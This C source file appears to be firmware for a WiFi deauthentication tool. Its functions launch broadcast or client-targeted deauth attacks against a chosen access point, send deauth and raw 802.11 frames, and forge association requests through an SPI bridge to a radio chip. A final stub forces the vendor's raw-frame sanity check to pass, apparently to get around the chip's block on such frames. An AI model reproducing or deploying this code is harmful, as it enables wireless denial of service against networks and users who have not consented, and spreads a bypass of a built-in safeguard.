#include "wifi_deauther.h"
#include "spi_bridge.h"
#include <string.h>

bool wifi_deauther_start(const wifi_ap_record_t *ap_record, deauth_frame_type_t type, bool is_broadcast) {
    uint8_t payload[14];
    memcpy(payload, ap_record->bssid, 6);
    memset(payload + 6, is_broadcast ? 0xFF : 0x00, 6); // Broadcast or AP itself
    payload[12] = (uint8_t)type;
    payload[13] = ap_record->primary;
    return (spi_bridge_send_command(SPI_ID_WIFI_APP_DEAUTHER, payload, sizeof(payload), NULL, NULL, 2000) == ESP_OK);
}

bool wifi_deauther_start_targeted(const wifi_ap_record_t *ap_record, const uint8_t client_mac[6], deauth_frame_type_t type) {
    uint8_t payload[14];
    memcpy(payload, ap_record->bssid, 6);
    memcpy(payload + 6, client_mac, 6);
    payload[12] = (uint8_t)type;
    payload[13] = ap_record->primary;
    return (spi_bridge_send_command(SPI_ID_WIFI_APP_DEAUTHER, payload, sizeof(payload), NULL, NULL, 2000) == ESP_OK);
}

void wifi_deauther_stop(void) {
    spi_bridge_send_command(SPI_ID_WIFI_APP_ATTACK_STOP, NULL, 0, NULL, NULL, 2000);
}

bool wifi_deauther_is_running(void) {
    spi_header_t resp;
    uint8_t payload[1] = {0};
    if (spi_bridge_send_command(SPI_ID_WIFI_DEAUTH_STATUS, NULL, 0, &resp, payload, 1000) == ESP_OK) {
        return payload[0] != 0;
    }
    return false;
}
void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    if (!ap_record) return;
    uint8_t payload[8];
    memcpy(payload, ap_record->bssid, 6);
    payload[6] = (uint8_t)type;
    payload[7] = ap_record->primary;
    spi_bridge_send_command(SPI_ID_WIFI_DEAUTH_SEND_FRAME, payload, sizeof(payload), NULL, NULL, 2000);
}
void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    if (!ap_record) return;
    uint8_t payload[8];
    memcpy(payload, ap_record->bssid, 6);
    payload[6] = (uint8_t)type;
    payload[7] = ap_record->primary;
    spi_bridge_send_command(SPI_ID_WIFI_DEAUTH_SEND_BROADCAST, payload, sizeof(payload), NULL, NULL, 2000);
}
void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
    if (!frame_buffer || size <= 0 || size > SPI_MAX_PAYLOAD) return;
    spi_bridge_send_command(SPI_ID_WIFI_DEAUTH_SEND_RAW, frame_buffer, (uint8_t)size, NULL, NULL, 2000);
}
void wifi_send_association_request(const wifi_ap_record_t *ap_record) {
    if (!ap_record) return;
    uint8_t payload[8 + 32];
    uint8_t ssid_len = (uint8_t)strnlen((const char *)ap_record->ssid, 32);
    memcpy(payload, ap_record->bssid, 6);
    payload[6] = ap_record->primary;
    payload[7] = ssid_len;
    memcpy(payload + 8, ap_record->ssid, ssid_len);
    spi_bridge_send_command(SPI_ID_WIFI_ASSOC_REQUEST, payload, (uint8_t)(8 + ssid_len), NULL, NULL, 2000);
}
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
